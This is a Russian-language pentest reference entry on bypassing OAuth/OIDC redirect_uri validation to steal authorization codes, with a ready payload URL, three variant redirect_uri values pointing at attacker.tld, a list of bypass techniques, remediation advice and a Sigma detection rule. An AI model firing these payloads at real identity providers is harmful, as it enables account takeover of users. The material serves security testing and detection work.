---
id: auth-bypass-oauth-redirect-uri-bypass
title: "OAuth/OIDC: обход валидации redirect_uri и утечка кода"
type: auth-bypass
target: oauth
category: web
difficulty: intermediate
bypass: filter
tags: [oauth, oidc, redirect-uri, account-takeover]
tested_on: ["типовые реализации OAuth2 (authorization code)", "Keycloak-подобные IdP"]
success_rate: 0.35
risk: critical
cwe: "CWE-601"
lab: null
tester: manual
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/all-topics"
graph:
  - target: "auth-bypass"
    type: instance_of
  - target: "open-redirect"
    type: related_to
  - target: "session-hijacking"
    type: leads_to
  - target: "jwt"
    type: related_to
---

# OAuth/OIDC: обход валидации redirect_uri и утечка кода

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
https://idp.example/authorize?client_id=app&response_type=code&redirect_uri=https://app.example/.%2e%2fprofile%2f..%2f..%2fredirect%3furl%3dhttps://attacker.tld&state=x&scope=openid
```

## Explanation

Безопасность authorization code flow целиком держится на точной проверке
`redirect_uri`. Рабочие обходы:

1. **Открытый редирект на зарегистрированном домене**: `redirect_uri` формально
    валиден, но ведёт на `/redirect?url=attacker.tld` — код уезжает наружу.
2. **Префиксная проверка**: `https://app.example.attacker.tld`,
    `https://app.example@attacker.tld`, `https://attacker.tld/app.example`.
3. **Нормализация пути**: `/..`, `/%2e%2e`, `/.`, двойные слеши — IdP сравнивает
    строку, браузер уходит в другое место.
4. **Параметры и фрагменты**: `?next=`, `#`, добавление query к разрешённому пути.
5. **Поддомены с XSS/забытый staging**: `redirect_uri` на `*.app.example`,
    где один поддомен уязвим.
6. **Отсутствие `state`** -> CSRF на callback: привязка аккаунта атакующего
    к сессии жертвы (login CSRF).
7. **Отсутствие PKCE в публичных клиентах** -> перехват кода в мобильном приложении
    через вредоносное приложение с той же scheme.
8. **Утечка `code`/`access_token` через Referer** на странице после редиректа.

Отдельно: `response_type=token` (implicit) устарел — токен в URL фрагменте
уходит в историю браузера и через Referer.

## Detection

1. Соберите authorize-запрос и поменяйте `redirect_uri` на: другой путь,
   поддомен, `@`-форму, форму с `..`, свой домен.
2. Проверьте наличие и валидацию `state` (одноразовый, привязан к сессии),
   `nonce` (для OIDC id_token), PKCE (`code_challenge`).
3. Поищите открытые редиректы на домене клиента — это готовый обход валидации.
4. Проверьте, инвалидируется ли `code` после первого обмена и привязан ли он
   к client_id + code_verifier.
5. Инструменты: ручной перебор в Burp, `oauth-redirect-scanner`-подобные скрипты.

## Remediation

- `redirect_uri` — **точное совпадение** со списком зарегистрированных значений
   (без префиксов, wildcard, нормализации на стороне клиента).
- Запрет открытых редиректов на доменах клиентов; аудит всех `/redirect`-эндпоинтов.
- Обязательный PKCE (RFC 7636) для всех клиентов, `state` + `nonce`,
   отказ от implicit flow (OAuth 2.1).
- `code` одноразовый, TTL ≤ 60 с, привязан к client_id и code_challenge.
- `Referrer-Policy: no-referrer` на callback-страницах; токен не в URL.
- Валидация `iss`/`aud`/`exp`/`azp` в id_token; проверка подписи по JWKS IdP.
- Отзыв компрометированных токенов (revocation endpoint) и алерты на аномалии.

## Variants

```
redirect_uri=https://app.example.attacker.tld/cb
```

```
redirect_uri=https://app.example/cb/../redirect?url=https://attacker.tld
```

```
redirect_uri=https://app.example@attacker.tld/cb
```

## Detection rules

```yaml
title: OAuth — обход валидации redirect_uri (traversal, поддомены, open redirect)
id: e5f6a7b8-0089-4e5f-9a7b-000000000089
status: experimental
description: >-
  redirect_uri содержит признаки обхода точной валидации: path-traversal
  (.%2e/, ..%2f), встроенный redirect-параметр (?url=http), смену хвоста
  домена. Успешный oauth_authorize с таким URI — утечка кода авторизации.
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://portswigger.net/web-security/oauth/authentication-bypass
logsource:
  category: application
  definition: 'логи IdP/приложения: событие oauth_authorize с redirect_uri + access-лог'
detection:
  selection_query:
    cs-uri-query|contains:
      - 'redirect_uri=https'
      - '.%2e%2f'
      - '%2e%2f'
      - '..%2f'
      - 'redirect_uri=%2f%2f'
      - '%3furl%3d'
  selection_app:
    event_action: oauth_authorize
    redirect_uri|contains:
      - '.%2e'
      - '..%2f'
      - '%3furl%3d'
      - '?url=http'
      - '//attacker'
  condition: selection_query or selection_app
fields:
  - c-ip
  - cs-uri-query
  - source_ip
  - redirect_uri
  - event_outcome
falsepositives:
  - легитимные deep-link редиректы внутри своего домена — сверяйте итоговый хост
    redirect_uri с белым списком
level: critical
tags:
  - attack.credential_access
  - attack.t1190
  - cwe.601
```
